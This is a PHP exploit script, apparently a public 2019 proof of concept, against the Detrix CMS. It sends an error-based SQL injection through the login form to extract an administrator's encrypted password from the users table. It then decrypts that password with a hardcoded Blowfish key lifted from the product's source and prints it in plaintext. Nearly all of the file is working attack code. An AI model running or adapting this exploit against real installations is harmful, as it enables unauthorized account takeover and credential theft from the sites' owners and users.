#!/usr/bin/php
<?php

/*---------------------------CHANGE-ME--------------------------------*/

$URL = "http://192.168.56.6"; // Set URL for the target host
$user_id = 0; // 0 - Default admin ID

/*--------------------------------------------------------------------*/

$banner = "Exploiting SQLi vuln and password decrypting for Detrix\n".
	"http://forum.detrix.kz\n_link_ \n".
	"sad.2.shade@mail.com, 2019.\n\n";

// SQLi request
$sql_req =
	"login' AND 99=CAST('a__'||(SELECT COALESCE(CAST(password AS ".
	"CHARACTER(10000)),(CHR(32))) FROM manuscript.ref_system_users OR".
	"DER BY id OFFSET " . $user_id . " LIMIT 1)::text||'__a' ".
	"AS NUMERIC) AND 'a'='a";

$data = array('password' => 'pass',
	'login' => $sql_req);

$options = array(
    'http' => array(
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    )
);

// Key from %detrix%/system/utils/MSF_string.php
$sSuperDuperSecretKey =
	"!-eeflslskdjfla;456864~}{fjkdlswkfkll@#$%#$9f0sf8a723#@";

echo $banner;

try {
	$context  = stream_context_create($options);
	echo "Send SQLi to $URL...\n";
	$result = file_get_contents($URL, false, $context);
} catch (Exception $e) {
    echo 'Error: ',  $e->getMessage(), "\n";
}

if ($result != "") {
	if (preg_match("/\"a__(.+)__a\"/", $result, $encrypted_pass) == 1) {

		$clear_pass = trim(
			openssl_decrypt(base64_decode($encrypted_pass[1]),
			"BF-ECB", $sSuperDuperSecretKey,
			OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING)
		); // Decrypt pass
		echo "Pass for User id $user_id: $clear_pass \n";
	} else echo "Error: no such User id:$user_id or empty password!\n";
} else echo "Error: empty Response or error!\n"

?>